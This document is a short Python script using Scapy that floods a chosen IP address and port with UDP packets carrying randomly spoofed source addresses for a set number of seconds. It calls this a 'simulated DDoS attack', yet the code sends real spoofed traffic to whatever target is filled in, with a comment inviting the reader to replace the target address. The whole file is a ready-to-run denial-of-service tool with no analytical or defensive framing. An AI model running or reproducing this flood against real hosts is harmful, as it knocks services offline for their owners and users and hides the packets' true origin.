from scapy.all import IP, UDP, send
import random
import time

def generate_random_ip():
    """
    Generate a random IP address.

    :return: A random IP address in the format 'x.x.x.x'.
    :rtype: str
    """
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def ddos_attack(target_ip, target_port, duration):
    """
    Simulate a DDoS attack by sending UDP packets to a target IP and port.

    :param target_ip: The target IP address.
    :type target_ip: str
    :param target_port: The target port.
    :type target_port: int
    :param duration: The duration of the attack in seconds.
    :type duration: int
    """
    packet_count = 0
    start_time = time.time()
    while time.time() - start_time < duration:
        # Generate a random source IP address
        src_ip = generate_random_ip()
        # Build the IP/UDP packet
        packet = IP(src=src_ip, dst=target_ip) / UDP(dport=target_port)
        # Send the packet
        send(packet, verbose=0)
        packet_count += 1

    print(f"Simulated DDoS attack: {packet_count} packets sent in {duration} seconds")

# Target attack parameters
target_ip = "192.168.1.19"  # Replace with the target IP address
target_port = 80  # Replace with the target port
duration = 60  # Duration of the attack in seconds

# Launch the simulated DDoS attack
ddos_attack(target_ip, target_port, duration)
